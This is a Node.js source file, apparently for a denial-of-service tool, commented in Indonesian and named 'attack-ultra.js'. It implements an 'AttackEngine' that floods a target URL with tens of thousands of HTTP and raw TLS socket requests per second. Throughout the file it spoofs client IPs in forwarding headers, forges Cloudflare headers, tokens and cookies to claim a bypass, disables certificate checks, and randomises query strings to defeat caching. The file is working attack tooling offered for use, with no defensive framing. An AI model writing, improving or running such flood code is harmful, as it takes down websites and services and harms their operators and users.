// attack-ultra.js - 50,000+ RPS ULTRA FAST Engine
const https = require('https');
const http = require('http');
const net = require('net');
const tls = require('tls');
const url = require('url');
const crypto = require('crypto');
const IP_LIST = require('./ip-list');
const USER_AGENTS = require('./user-agents');
const REFERERS = require('./referers');
const CF_BYPASS = require('./cf-bypass');

// OPTIMASI EKSTREM
const agentOptions = {
    keepAlive: true,
    keepAliveMsecs: 100,
    maxSockets: Infinity,
    maxFreeSockets: 1000,
    scheduling: 'fifo',
    timeout: 500
};

const httpAgent = new http.Agent(agentOptions);
const httpsAgent = new https.Agent({ 
    ...agentOptions, 
    rejectUnauthorized: false,
    secureOptions: crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1,
    ciphers: 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384'
});

class AttackEngine {
    constructor() {
        this.isAttacking = false;
        this.stats = {
            total: 0,
            success: 0,
            failed: 0,
            cfBypassed: 0,
            rps: 0
        };
        this.workers = [];
        this.targetRequests = 0;
        this.duration = 0;
        this.startTime = 0;
        this.lastStatsTime = Date.now();
        this.lastTotal = 0;
        
        // PRE-CACHE untuk kecepatan maksimal
        console.log("[+] Pre-caching data untuk 50K RPS...");
        this.cacheSize = 50000;
        this.requestCache = [];
        this.cacheIndex = 0;
        
        for (let i = 0; i < this.cacheSize; i++) {
            this.requestCache.push({
                ip: IP_LIST[Math.floor(Math.random() * IP_LIST.length)],
                ua: USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)],
                referer: REFERERS[Math.floor(Math.random() * REFERERS.length)],
                cfToken: CF_BYPASS.tokens[Math.floor(Math.random() * CF_BYPASS.tokens.length)],
                cfCookie: CF_BYPASS.cookies[Math.floor(Math.random() * CF_BYPASS.cookies.length)],
                country: CF_BYPASS.countries[Math.floor(Math.random() * CF_BYPASS.countries.length)],
                path: this.generateRandomPath(),
                query: this.generateRandomQuery()
            });
        }
        
        console.log(`[✓] ${this.cacheSize.toLocaleString()} requests pre-cached`);
    }

    generateRandomPath() {
        const paths = ['', '/', '/index.html', '/home', '/api', '/v1', '/v2', '/data', '/json'];
        return paths[Math.floor(Math.random() * paths.length)];
    }

    generateRandomQuery() {
        return `_=${Date.now()}&r=${Math.random().toString(36).substring(7)}&t=${Date.now()}`;
    }

    async start(target, threads, duration, targetRequests, callback) {
        this.isAttacking = true;
        this.target = target;
        this.callback = callback;
        this.duration = duration * 1000;
        this.targetRequests = targetRequests;
        
        const parsed = new URL(target);
        this.hostname = parsed.hostname;
        this.port = parsed.port || (parsed.protocol === 'https:' ? 443 : 80);
        this.protocol = parsed.protocol;
        this.basePath = parsed.pathname;
        
        this.startTime = Date.now();
        
        console.log(`
╔══════════════════════════════════════════════════╗
║        50,000+ RPS ATTACK STARTED               ║
╠══════════════════════════════════════════════════╣
║  Target: ${target.substring(0, 40)}...
║  Threads: ${threads.toLocaleString()}
║  Target RPS: 50,000+
║  CloudFlare: BYPASS ACTIVE
║  IP Pool: ${IP_LIST.length.toLocaleString()}
║  Status: ATTACKING
╚══════════════════════════════════════════════════╝
        `);
        
        // HITUNG DISTRIBUSI UNTUK 50K RPS
        const httpThreads = Math.floor(threads * 0.85); // 85% HTTP
        const socketThreads = threads - httpThreads;    // 15% SOCKET
        
        // START MASSIVE HTTP WORKERS (25 request per loop untuk 50K RPS)
        for (let i = 0; i < httpThreads; i++) {
            this.startHttpWorker(25); // 25 request per loop
        }
        
        // START SOCKET WORKERS
        for (let i = 0; i < socketThreads; i++) {
            this.startSocketWorker(15); // 15 request per loop
        }
        
        // MONITOR dengan interval super cepat
        this.monitor();
    }

    stop() {
        this.isAttacking = false;
        console.log("[!] Attack stopped");
    }

    getCachedRequest() {
        this.cacheIndex = (this.cacheIndex + 1) % this.cacheSize;
        return this.requestCache[this.cacheIndex];
    }

    startHttpWorker(batchSize) {
        const worker = () => {
            while (this.isAttacking && this.checkLimits()) {
                // KIRIM BATCH REQUEST UNTUK 50K RPS
                for (let i = 0; i < batchSize; i++) {
                    this.sendHttpRequest();
                }
            }
        };
        
        // Multiple instances per worker
        for (let i = 0; i < 5; i++) {
            setImmediate(worker);
        }
    }

    startSocketWorker(batchSize) {
        const worker = () => {
            while (this.isAttacking && this.checkLimits()) {
                for (let i = 0; i < batchSize; i++) {
                    this.sendSocketRequest();
                }
            }
        };
        
        for (let i = 0; i < 5; i++) {
            setImmediate(worker);
        }
    }

    sendHttpRequest() {
        try {
            const cached = this.getCachedRequest();
            
            // BUILD HEADERS CEPAT
            const headers = {
                'Host': this.hostname,
                'User-Agent': cached.ua,
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.9',
                'Accept-Encoding': 'gzip, deflate, br',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
                'Cache-Control': 'no-cache, no-store, must-revalidate, max-age=0',
                'Pragma': 'no-cache',
                'Expires': '0',
                
                // CLOUDFLARE BYPASS HEADERS
                'CF-IPCountry': cached.country,
                'CF-Visitor': '{"scheme":"https"}',
                'CF-Ray': crypto.createHash('md5').update(Date.now().toString()).digest('hex').substring(0, 16),
                
                // IP SPOOFING
                'X-Forwarded-For': cached.ip,
                'X-Real-IP': cached.ip,
                'CF-Connecting-IP': cached.ip,
                'True-Client-IP': cached.ip,
                'X-Client-IP': cached.ip,
                
                // REFERER
                'Referer': cached.referer,
                
                // COOKIES
                'Cookie': cached.cfCookie
            };
            
            // PATH DENGAN QUERY UNIK
            const path = this.basePath + (this.basePath.includes('?') ? '&' : '?') + cached.query;
            
            const options = {
                hostname: this.hostname,
                port: this.port,
                path: path,
                method: 'GET',
                headers: headers,
                agent: this.protocol === 'https:' ? httpsAgent : httpAgent,
                timeout: 300,
                rejectUnauthorized: false
            };
            
            const req = (this.protocol === 'https:' ? https : http).request(options);
            
            // HANDLE RESPONSE CEPAT
            req.on('response', (res) => {
                this.stats.total++;
                
                if (res.statusCode === 200) {
                    this.stats.success++;
                    this.stats.cfBypassed++;
                } else if (res.statusCode < 500) {
                    this.stats.success++;
                } else {
                    this.stats.failed++;
                }
                
                res.destroy(); // LANGSUNG DESTROY UNTUK HEMAT MEMORY
            });
            
            req.on('error', () => {
                this.stats.total++;
                this.stats.failed++;
            });
            
            req.on('timeout', () => {
                req.destroy();
                this.stats.total++;
                this.stats.failed++;
            });
            
            req.end();
            
        } catch (e) {
            this.stats.total++;
            this.stats.failed++;
        }
    }

    sendSocketRequest() {
        try {
            const cached = this.getCachedRequest();
            
            // SOCKET OPTIMIZATION
            const socket = new net.Socket();
            socket.setTimeout(300);
            socket.setNoDelay(true);
            
            socket.connect(this.port, this.hostname, () => {
                if (this.protocol === 'https:') {
                    const tlsSocket = tls.connect({
                        socket: socket,
                        host: this.hostname,
                        rejectUnauthorized: false,
                        secureOptions: crypto.constants.SSL_OP_NO_TLSv1 | crypto.constants.SSL_OP_NO_TLSv1_1,
                        ciphers: 'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384'
                    }, () => {
                        const request = [
                            `GET ${this.basePath}?${cached.query} HTTP/1.1`,
                            `Host: ${this.hostname}`,
                            `User-Agent: ${cached.ua}`,
                            `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8`,
                            `Accept-Language: en-US,en;q=0.9`,
                            `Connection: close`,
                            `X-Forwarded-For: ${cached.ip}`,
                            `CF-Connecting-IP: ${cached.ip}`,
                            `CF-IPCountry: ${cached.country}`,
                            `CF-Visitor: {"scheme":"https"}`,
                            `Referer: ${cached.referer}`,
                            `Cookie: ${cached.cfCookie}`,
                            `Cache-Control: no-cache`,
                            ``
                        ].join('\r\n');
                        
                        tlsSocket.write(request);
                        this.stats.total++;
                        this.stats.success++;
                    });
                    
                    tlsSocket.on('error', () => {
                        this.stats.total++;
                        this.stats.failed++;
                    });
                    
                } else {
                    const request = [
                        `GET ${this.basePath}?${cached.query} HTTP/1.1`,
                        `Host: ${this.hostname}`,
                        `User-Agent: ${cached.ua}`,
                        `Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8`,
                        `Connection: close`,
                        `X-Forwarded-For: ${cached.ip}`,
                        `Referer: ${cached.referer}`,
                        `Cache-Control: no-cache`,
                        ``
                    ].join('\r\n');
                    
                    socket.write(request);
                    this.stats.total++;
                    this.stats.success++;
                }
            });
            
            socket.on('error', () => {
                this.stats.total++;
                this.stats.failed++;
            });
            
            socket.on('timeout', () => {
                socket.destroy();
            });
            
        } catch (e) {
            this.stats.total++;
            this.stats.failed++;
        }
    }

    checkLimits() {
        // NO LIMIT! Hanya cek kalau di-set
        if (this.duration > 0) {
            const elapsed = Date.now() - this.startTime;
            if (elapsed >= this.duration) {
                this.isAttacking = false;
                return false;
            }
        }
        
        if (this.targetRequests > 0 && this.stats.total >= this.targetRequests) {
            this.isAttacking = false;
            return false;
        }
        
        return true;
    }

    monitor() {
        const interval = setInterval(() => {
            if (!this.isAttacking) {
                clearInterval(interval);
                
                const elapsed = (Date.now() - this.startTime) / 1000;
                const avgRPS = Math.round(this.stats.total / elapsed);
                
                const report = {
                    total: this.stats.total,
                    success: this.stats.success,
                    failed: this.stats.failed,
                    cfBypassed: this.stats.cfBypassed,
                    elapsed: elapsed.toFixed(1),
                    rps: avgRPS
                };
                
                console.log(`
╔══════════════════════════════════════════════════╗
║              ATTACK COMPLETED                    ║
╠══════════════════════════════════════════════════╣
║  Total Requests: ${this.stats.total.toLocaleString().padStart(12)}
║  Successful: ${this.stats.success.toLocaleString().padStart(15)}
║  CF Bypassed: ${this.stats.cfBypassed.toLocaleString().padStart(14)}
║  Duration: ${elapsed.toFixed(1)}s
║  Average RPS: ${avgRPS.toLocaleString().padStart(12)}
║  50K RPS: ${avgRPS >= 50000 ? '✅ ACHIEVED' : '❌ NOT ACHIEVED'}
╚══════════════════════════════════════════════════╝
                `);
                
                if (this.callback) {
                    this.callback(report);
                }
                
                return;
            }
            
            // HITUNG RPS REAL-TIME
            const now = Date.now();
            const elapsed = (now - this.startTime) / 1000;
            const timeDiff = (now - this.lastStatsTime) / 1000;
            
            if (timeDiff >= 0.5) { // UPDATE SETIAP 0.5 DETIK
                const currentTotal = this.stats.total;
                const currentRPS = Math.round((currentTotal - this.lastTotal) / timeDiff);
                
                this.stats.rps = currentRPS;
                this.lastTotal = currentTotal;
                this.lastStatsTime = now;
                
                // TAMPILKAN RPS REAL-TIME
                if (currentRPS >= 50000) {
                    process.stdout.write(`\r⚡ RPS: ${currentRPS.toLocaleString()} 🎯 50K ACHIEVED! `);
                } else {
                    process.stdout.write(`\r⚡ RPS: ${currentRPS.toLocaleString()} 🎯 Target: 50,000 `);
                }
                
                const progress = {
                    total: this.stats.total,
                    success: this.stats.success,
                    failed: this.stats.failed,
                    cfBypassed: this.stats.cfBypassed,
                    elapsed: elapsed.toFixed(1),
                    rps: currentRPS
                };
                
                if (this.callback) {
                    this.callback(progress);
                }
            }
            
        }, 100); // CHECK SETIAP 100ms
    }
}

// FUNGSI FORMAT ANGKA
function formatNumber(num) {
    return num.toString().replace(/\B(?=(\d{3})+(?!\d))/g, ",");
}

module.exports = AttackEngine;